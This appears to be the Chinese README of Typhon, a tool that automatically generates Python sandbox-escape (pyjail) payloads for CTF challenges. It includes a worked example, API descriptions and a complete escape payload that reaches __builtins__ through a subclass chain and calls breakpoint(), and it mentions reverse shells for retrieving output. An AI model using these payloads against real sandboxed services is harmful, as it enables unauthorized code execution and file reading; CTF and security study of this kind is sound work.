## Typhon <https://github.com/LamentXU123/Typhon>

<!--auto_detail_badge_begin_0b490ffb61b26b45de3ea5d7dd8a582e-->
[![PyPI Downloads](https://static.pepy.tech/personalized-badge/typhonbreaker?period=total&units=ABBREVIATION&left_color=BLACK&right_color=GREEN&left_text=total%20downloads)](https://pepy.tech/projects/typhonbreaker)
![License](https://img.shields.io/badge/license-Apache_2.0-cyan.svg)
![Python_version](https://img.shields.io/pypi/pyversions/TyphonBreaker.svg?logo=python&logoColor=FBE072)
![PyPI Version](https://img.shields.io/pypi/v/TyphonBreaker)
![Tests](https://github.com/Team-intN18-SoybeanSeclab/Typhon/actions/workflows/test.yml/badge.svg)
[![codecov](https://codecov.io/gh/LamentXU123/Typhon/graph/badge.svg?token=JCH6XBAORY)](https://codecov.io/gh/LamentXU123/Typhon)
<!--auto_detail_badge_end_fef74f2d7ea73fcc43ff78e05b1e7451-->


听着，我已经受够那些愚蠢的CTF pyjail题目了——每次我都要浪费时间在又臭又长的黑名单和各种pyjail总结之间找哪个链子没被过滤，或者在命名空间里一个一个运行`dir()`去找能用的东西。这简直就是一种折磨。

所以这就是Typhon（提丰），一个致力于让你不需要脑子也能做pyjail的一把梭工具。


文档: https://typhonbreaker.readthedocs.io/  
博客: https://www.cnblogs.com/LAMENTXU/articles/19101758

**请务必看完本readme后再使用Typhon工具，尤其是[Q&A](#QA)部分。**

- [Highlights](#Highlights)  
- [How to Use](#How-to-Use)  
- [Q&A](#QA)
- [Proof of Concept](#Proof-of-Concept)  
- [Limitations](#Limitations)  
- [Milestones](#Milestones)  
- [Contributing](#Contributing)  
- [Credits](#Credits)  
- [License](#License)  

## Highlights

- 完全开源，免费的一把梭工具  
- 不需要大脑就能完成pyjail题目，爱护您的脑细胞和眼球
- 拥有数百条gadgets和几乎所有主流的bypass方法
- 支持多种函数以达成不同功能，如RCE用`bypassRCE()`, 读文件用`bypassRead()`等等
- 不依赖任何第三方库，使用纯python3实现

## How to Use

### Install

你可以使用pip进行安装：

```
pip install TyphonBreaker
```

### Interface

**in Code**

```python
import Typhon
Typhon.bypassRCE(cmd: str,
    local_scope:dict=None,
    banned_chr:list=[],
    allowed_chr:list=[],
    banned_ast:list=[],
    banned_re:list=[],
    max_length:int=None,
    allow_unicode_bypass:bool=False,
    print_all_payload:bool=False,
    interactive:bool=True,
    depth:int=5,
    recursion_limit:int=200,
    log_level:str='INFO')
```

- `cmd`: RCE所使用的bash command  
- `local_scope`: 沙箱内的全局变量空间，若无限制则忽略此参数  
- `banned_chr`: 禁止的字符  
- `allowed_chr`: 允许的字符（`[]`为全部允许）  
- `banned_ast`: 禁止的AST节点  
- `banned_re`: 禁止的正则表达式（列表或字符串）  
- `max_length`: payload的最大长度  
- `allow_unicode_bypass`: 是否允许unicode绕过  
- `print_all_payload`: 是否打印所有payload   
- `interactive`: 当前pyjail是否允许`stdin`（即如`breakpoint()`等payload是否成立）  
- `depth`: 组合bypasser的最大深度（建议使用默认值）  
- `recursion_limit`: 最大递归深度（建议使用默认值）  
- `log_level`: 输出级别
    - `info`: 正常输出
    - `debug`: 调试输出，包含更多信息
    - `quiet`: 静默模式，只有banner和最终结果输出

```python
import Typhon
Typhon.bypassREAD(filepath: str,
    mode:str='eval',
    local_scope:dict=None,
    banned_chr:list=[],
    allowed_chr:list=[],
    banned_ast:list=[],
    banned_re:list=[],
    max_length:int=None,
    allow_unicode_bypass:bool=False,
    print_all_payload:bool=False,
    interactive:bool=True,
    depth:int=5,
    recursion_limit:int=200,
    log_level:str='INFO')
```

- `filepath`: 所读取的文件路径  
- `mode`: 沙箱内RCE的模式，可选`eval`或`exec`，关系到最后外带输出的逻辑  
- `local_scope`: 沙箱内的全局变量空间，若无限制则忽略此参数  
- `banned_chr`: 禁止的字符  
- `allowed_chr`: 允许的字符（`[]`为全部允许）  
- `banned_ast`: 禁止的AST节点  
- `banned_re`: 禁止的正则表达式（列表或字符串）  
- `max_length`: payload的最大长度  
- `allow_unicode_bypass`: 是否允许unicode绕过  
- `print_all_payload`: 是否打印所有payload   
- `interactive`: 当前pyjail是否允许`stdin`（即如`breakpoint()`等payload是否成立）  
- `depth`: 组合bypasser的最大深度（建议使用默认值）  
- `recursion_limit`: 最大递归深度（建议使用默认值）  
- `log_level`: 输出级别
    - `info`: 正常输出
    - `debug`: 调试输出，包含更多信息
    - `quiet`: 静默模式，只有banner和最终结果输出

**此处注：此工具目前对`bypassREAD`函数的处理很不严谨。该函数将在后面的版本中得到大幅度的改善和细化。**

**Command Line Interface**

这部分不是本工具的重点，但是PR welcome. 

## Step by Step Tutorial

你可以通过[示例文档](https://typhon.lamentxu.top/zh-cn/latest/EXAMPLE.html)中的例题来学习 Typhon 的实战用法。以下仅仅提供一个示例。

假设有如下题目：

```python
import re
def safe_run(cmd):
    if len(cmd) > 160:
        return "Command too long"
    if any([i for i in ['import', '__builtins__', '{}'] if i in cmd]):
        return "WAF!"
    if re.match(r'.*import.*', cmd):
        return "WAF!"
    exec(cmd, {'__builtins__': {}})

safe_run(input("Enter command: "))
```

**Step1. 分析waf**

首先，我们需要分析一下pyjail waf的功能（这可能是唯一需要大脑的地方）。

可以看出，上述题目的waf如下：

- 限制长度最大值为160
- 在exec的命名空间里没有`__builtins__`
- 禁止使用`builtins`, `import`, `{}`字符
- 设置了正则表达式`'.*import.*'`限制条件

**Step2. 将waf导入Typhon**

首先我们将exec行删除：

```python
import re
def safe_run(cmd):
    if len(cmd) > 160:
        return "Command too long"
    if any([i for i in ['import', '__builtins__', '{}'] if i in cmd]):
        return "WAF!"
    if re.match(r'.*import.*', cmd):
        return "WAF!"

safe_run(input("Enter command: "))
```

然后，我们以Typhon对应的bypass函数替代exec行，在对应位置导入WAF, **并在该行上方`import Typhon`**：

```python
import re
def safe_run(cmd):
    import Typhon
    Typhon.bypassRCE(cmd,
    banned_chr=['__builtins__', 'import', '{}'],
    banned_re='.*import.*',
    local_scope={'__builtins__': {}},
    max_length=160)

safe_run(input("Enter command: "))
```

**Step3. 运行**

运行你的题目程序，等待**Jail broken**的信息出现即可。

![image](./image/step-by-step-tutorial.png)

# Q&A

- 何时`import Typhon`？

一定要将行`import Typhon`放在`Typhon`内置绕过函数的上一行（即使你患有PEP-8强迫症）。否则，`Typhon`将无法通过栈帧获取当前的全局变量空间。

**Do:**
```python
def safe_run(cmd):
    import Typhon
    Typhon.bypassRCE(cmd,
    banned_chr=['builtins', 'os', 'exec', 'import'])

safe_run('cat /f*')
```

**Don't:**
```python
import Typhon

def safe_run(cmd):
    Typhon.bypassRCE(cmd,
    banned_chr=['builtins', 'os', 'exec', 'import'])

safe_run('cat /f*')
```

- 为什么需要使用与题目相同的python版本？

Pyjail中存在一些通过索引寻找对应object的gadgets（如继承链）。继承链的利用随着索引变化很大。因此，请务必确保Typhon的运行环境与题目相同。

**无法保证？**

是的，大多数题目都不会给出对应的python版本。因此，**Typhon会在使用涉及版本的gadgets时做出提示**。  

![image](./image/reminder_example.png)

这种情况下往往需要CTF选手自己去找题目环境中该gadgets需要的索引值。  

- 如果题目的`exec`和`eval`没有限制命名空间怎么办？

假设题目没有限制命名空间，则不必填写`local_scope`参数。Typhon会自动使用`import Typhon`时的当前命名空间进行绕过

- 这个payload我用不了能不能换一个？

你可以在参数中加上`print_all_payload=True`，Typhon就会打印其生成的所有payload。

- 这个WEB题好像没开放stdin，我`exec(input())`没用怎么办？

你可以在参数中加上`interactive=False`，Typhon就会禁止使用所有涉及`stdin`的payload。

- 最后输出的payload没回显怎么办？

对于`bypassRCE`，我们认为：**只要命令得到了执行，就是RCE成功。** 至于回显问题，你可以选择反弹shell，时间盲注，或者：添加`print_all_payload=True`参数，查看所有payload，其中可能含有能够成功回显的payload。

## Proof of Concept

Typhon的工作原理如下：

### bypass by path & technique

我们定义两种bypass方式：

- path: 通过不同的载荷进行绕过（例如`os.system('calc')`和`subprocess.Popen('calc')`）  
- technique: 使用不同技术对相同的有效载荷进行处理从而绕过（例如，`os.system('c'+'a'+'l'+'c')` 和 `os.system('clac'[::-1])`)  

Typhon内置了上百种path。每次我们要绕过获取某个东西时，我们先通过local_scope找到所有可以用的`path`，接下来，通过`bypasser.py`中的`technique`生成每个`path`对应的不同变体，并尝试绕过黑名单。

### gadgets chain

本思路受到[pyjailbreaker](https://github.com/jailctf/pyjailbreaker)工具的启发。

pyjailbreaker不直接通过gadgets一步到位实现RCE，而是一步一步寻找RCE链条中需要的项。如假设存在下列黑名单：

- 本地命名空间无`__builtins__`
- 禁止使用`builtins`字符

对于这个WAF，Typhon是这样处理的：

- 首先，我们通过`'J'.__class__.__class__`获取`type`
- 随后，我们找到获取type后可能可以获取builtins的RCE链子`TYPE.__subclasses__(TYPE)[0].register.__globals__['__builtins__']`
- 已知题目黑名单过滤了`__builtins__`字符，则我们将此path投入bypasser产生数十种变体。选择其中最短的变体：`TYPE.__subclasses__(TYPE)[0].register.__globals__['__snitliub__'[::-1]]`
- 随后，我们找到获取``__builtins__``后的RCE链子`BUILTINS_SET['breakpoint']()`
- 最后，我们将代表builtins字典的占位符`BUILTINS_SET`替换为上步中获取的`__builtins__`路径，以此类推，将`TYPE`占位符替换为真实的路径，就得到了最终的payload。

```python
'J'.__class__.__class__.__subclasses__('J'.__class__.__class__)[0].register.__globals__['__snitliub__'[::-1]]['breakpoint']()
```

### Step by Step

Typhon的workflow顺序如下：

- 每一个终点函数（`bypassRCE`, `bypassREAD`，etc.）都会调用主函数`bypassMAIN`，主函数会尽可能搜集所有的可用gadgets（如上例中的`type`）并将收集到的内容传递给对应的下级函数。
- `bypassMAIN`函数在简单分析完当前的变量空间后，会：
  - 尝试直接RCE（如`help()`, `breakporint()`）
  - 尝试获取生成器
  - 尝试获取type
  - 尝试获取object
  - 尝试获取bytes
  - 如当前空间中的``__builtins__``未被删除，但被修改，尝试恢复（如`id.__self__`）
  - 如当前空间中的``__builtins__``被删除，尝试从其他命名空间恢复
  - 承上，尝试继承链绕过
  - 尝试获取import包的能力
  - 尝试直接通过可能恢复的``__builtins__`` RCE
  - 将结果传递给下级函数
- 下级函数拿到`bypassMAIN`的结果后，会根据该函数所实现的需求，选择对应的gadgets进行处理（如`bypassRCE`专注于RCE，`bypassREAD`专注于文件读取，`bypassENV`专注于读取环境变量）。其过程与上述相似。

## Limitations

- 目前Typhon只支持python 3.9及以上版本。
- 目前Typhon只支持linux沙箱。
- 目前Typhon尚无法绕过audithook沙箱。
- 由于Typhon采用局部最优的递归策略，对于一些简单的题目，反而需要耗时更久（约1min）。
- 目前已知的不支持的bypass方法：

  - Typhon不支持以`list.pop(0)`代替`list[0]`，这是因为Typhon所生成的payload都需要经过本地执行验证才能成立，而`pop`方法在验证时会将元素从列表中删除，从而破坏后续环境。

## Milestones

### v1.0 （已发布）

- [x] 实现基本框架

### v1.1

- [ ] 实现更多绕过器
    - [x] 使用魔术方法替换二元运算符 (`a.__add__(b)`替换`a+b`)
    - [ ] `list.pop(0)`替换`list[0]`
    - [x] `list(dict(a=1))[0]`替换`'a'`
    - [x] `str()`替换空字符串
- [ ] 实现内置的bash bypasser 
- [ ] 更好的`bypassREAD`函数  
- [x] 实现白名单功能
- [x] 自动寻找`bytes`

### v1.2

- [ ] 实现`audithook`沙箱的绕过  
- [ ] 在没有长度限制的情况下，不使用局部长度最优的递归算法
- [ ] 实现`bypassENV`函数，用于环境变量的读取

## Contributing

### 提供Typhon无法解出的题目

我们将长期收集Typhon无法解出的题目。这对提升工具性能及其重要！如果你碰到无法一把梭的题目，请于本仓库打开issue，并写明题目来源（最好有对应的题解），我们会尽可能实现对该题目的自动求解。

作为回报，我们会在下一个release版本中囊括您的github ID。

## Credits

**Author & Maintainer**

@ [LamentXU (Weilin Du)](https://github.com/LamentXU123)  

**Contributors**

感谢所有对此项目做过贡献的人：

<a href="https://github.com/eryajf/learn-github/graphs/contributors">
  <img src="https://contrib.rocks/image?repo=Team-intN18-SoybeanSeclab/Typhon" />
</a>

**Copyright**

针对bash绕过的内置绕过器，感谢[bashFuck](https://github.com/ProbiusOfficial/bashFuck)项目的作者@ [ProbiusOfficial](https://github.com/ProbiusOfficial)，其[License](https://github.com/ProbiusOfficial/bashFuck/blob/main/README.md)于此。

Copyright (c) 2024 ProbiusOfficial.

下游项目（若有）请务必涵盖此。

另：当前版本中尚未添加此功能。此copyright信息为预先保留。

**Speical Thanks**

@ [黄豆安全实验室](https://hdsec.cn)给予我必须的鼓励  
@ [pyjailbreaker](https://github.com/jailctf/pyjailbreaker)项目给予我启发  

## License

这个项目在[Apache 2.0](https://github.com/LamentXU123/Typhon/blob/main/LICENSE)协议下发布。

Copyright (c) 2025 Weilin Du.

## 404星链计划
<img src="https://github.com/knownsec/404StarLink/raw/master/Images/logo.png" width="30%">

Typhon 现已加入 [404星链计划](https://github.com/knownsec/404StarLink)

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://api.star-history.com/svg?repos=Team-intN18-SoybeanSeclab/Typhon&type=Date&theme=dark" />
  <source media="(prefers-color-scheme: light)" srcset="https://api.star-history.com/svg?repos=Team-intN18-SoybeanSeclab/Typhon&type=Date" />
  <img alt="Star History Chart" src="https://api.star-history.com/svg?repos=Team-intN18-SoybeanSeclab/Typhon&type=Date" />
</picture>



## 最近更新


<!--auto_detail_active_end_f9cf7911015e9913b7e691a7a5878527-->
